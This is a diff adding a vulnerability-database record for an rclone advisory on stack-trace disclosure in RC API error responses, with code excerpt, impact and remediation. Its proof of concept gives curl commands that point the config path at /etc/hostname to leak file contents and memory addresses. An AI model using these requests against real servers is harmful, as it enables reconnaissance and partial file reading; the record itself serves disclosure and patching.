@@ -1,0 +1,89 @@
+[basic]
+description = '''
+### Summary
+
+When an RC API call triggers a panic (recovered by the job runner), the full Go stack trace is included in the JSON error response. This leaks internal file paths, Go module versions, goroutine state, and memory addresses to the API caller.
+
+### Details
+
+The panic recovery in `fs/rc/jobs/job.go:110-115`:
+
+```go
+func (j *Job) run(ctx context.Context, fn rc.Func, in rc.Params) {
+    defer func() {
+        if r := recover(); r != nil {
+            j.mu.Lock()
+            j.EndTime = time.Now()
+            j.Error = fmt.Sprintf(\"panic received: %v \n%s\", r, string(debug.Stack()))
+            // ...
+        }
+    }()
+```
+
+The full `debug.Stack()` output is placed into `j.Error`, which is then returned in the HTTP response JSON.
+
+### PoC
+
+Trigger a parse error by setting config path to a non-INI file, then calling dump:
+
+```bash
+curl -s -X POST http://localhost:5572/config/setpath \
+  -H \"Content-Type: application/json\" \
+  -d '{\"path\":\"/etc/hostname\"}' 
+
+curl -s -X POST http://localhost:5572/config/dump
+```
+
+Response includes:
+
+```json
+{
+  \"error\": \"panic received: fatal error: Failed to load config file \\"/etc/hostname\\": could not parse line: ... \ngoroutine 9 [running]:\nruntime/debug.Stack()\n\truntime/debug/stack.go:26 +0x64\ngithub.com/rclone/rclone/fs/rc/jobs.(*Job).run.func1()\n\tgithub.com/rclone/rclone/fs/rc/jobs/job.go:112 +0x34\n...\",
+  \"status\": 500
+}
+```
+
+**Disclosed information includes:**
+- Full filesystem paths (`github.com/rclone/rclone/fs/config/config.go:377`)
+- Go module versions (`github.com/go-chi/chi/v5@v5.2.5`)
+- Go runtime version (from binary)
+- Goroutine IDs and states
+- Memory addresses (ASLR leak)
+- File contents (first unparseable line of the target file)
+
+**Tested and confirmed on rclone v1.74.4.**
+
+### Impact
+
+Information disclosure that aids exploitation of other vulnerabilities. Stack traces reveal internal architecture, dependency versions (useful for known-CVE targeting), and memory layout. The error message also leaks partial file contents (the first line that fails INI parsing), which can be used alongside the arbitrary file read finding as a complementary file read primitive for non-INI files.
+
+### Affected Versions
+
+All versions with RC API support through at least v1.74.4.
+
+### Remediation
+
+Return a generic error message to the API caller. Log the full stack trace server-side only. Strip `debug.Stack()` from HTTP responses.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "rclone: Verbose Stack Trace Disclosure in RC API Error Responses"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-gwfq-86j8-7qhv"]
+ave_id = "AVE-2026-1438"
+
+[meta]
+collected_at = "2026-08-08T11:44:09Z"
+status = "completed"
+
+[references]
+urls = []
